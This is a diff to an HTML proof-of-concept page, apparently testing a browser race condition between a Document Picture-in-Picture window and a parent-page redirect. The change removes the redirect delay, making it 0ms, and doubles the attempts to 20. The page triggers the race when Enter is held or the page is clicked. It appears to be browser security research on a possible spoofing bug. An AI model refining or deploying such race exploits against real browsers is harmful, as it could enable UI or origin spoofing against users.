@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP + Redirect Race Upgrade</title>
+<title>Ultra-Fast PiP Race</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -14,8 +14,8 @@
 </head>
 <body>
 
-<h1>Hold Enter</h1>
-<p>Press and hold Enter to trigger PiP + Redirect race.</p>
+<h1>Hold Enter (Ultra Race)</h1>
+<p>Press and hold Enter to trigger PiP + Redirect race (0ms).</p>
 <div id="status">[*] Ready...</div>
 
 <script>
@@ -24,15 +24,15 @@
 
   var statusEl = document.getElementById('status');
   var counter = 0;
-  var maxAttempts = 10;
+  var maxAttempts = 20;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Race] " + msg);
+    console.log("[Ultra PiP Race] " + msg);
   }
 
   // ============================================
-  // 1. FUNGSI UTAMA: PiP + REDIRECT RACE
+  // 1. FUNGSI UTAMA: PiP + REDIRECT RACE (0ms)
   // ============================================
   async function triggerRace() {
     if (counter >= maxAttempts) {
@@ -43,15 +43,13 @@
     log("[*] Attempt #" + counter);
 
     // ============================================
-    // A. BUKA PiP (ASYNC) DAN REDIRECT (LANGSUNG)
+    // A. BUKA PiP (ASYNC)
     // ============================================
-    
-    // 1. Buka PiP
     const pipPromise = documentPictureInPicture.requestWindow({
       width: 600,
       height: 400
     }).then(pipWindow => {
-      // Navigasi PiP ke example.com
+      // Navigasi PiP ke example.com (setelah PiP siap)
       pipWindow.location.href = 'https://example.com';
       return pipWindow;
     }).catch(err => {
@@ -59,13 +57,17 @@
       return null;
     });
 
-    // 2. REDIRECT PARENT (LANGSUNG, 0ms)
-    setTimeout(() => {
-      log("[*] Redirecting parent to google.com/x...");
+    // ============================================
+    // B. REDIRECT PARENT (LANGSUNG, 0ms)
+    // ============================================
+    // Tidak ada setTimeout. Langsung eksekusi.
+    try {
       window.location.href = 'https://google.com/x';
-    }, 100); // 100ms delay (sesuai kode asli, bisa diubah)
+    } catch (e) {}
 
-    // 3. Tunggu PiP siap (tidak blocking)
+    // ============================================
+    // C. TUNGGU PiP (OPSIONAL)
+    // ============================================
     pipPromise.then(pipWindow => {
       if (pipWindow) {
         log("[+] PiP opened and navigated to example.com");
@@ -83,7 +85,7 @@
   };
 
   // ============================================
-  // 3. TOMBOL UNTUK MEMUDAHKAN (OPSIONAL)
+  // 3. CLICK LISTENER (OPSIONAL)
   // ============================================
   document.body.addEventListener('click', function() {
     triggerRace();
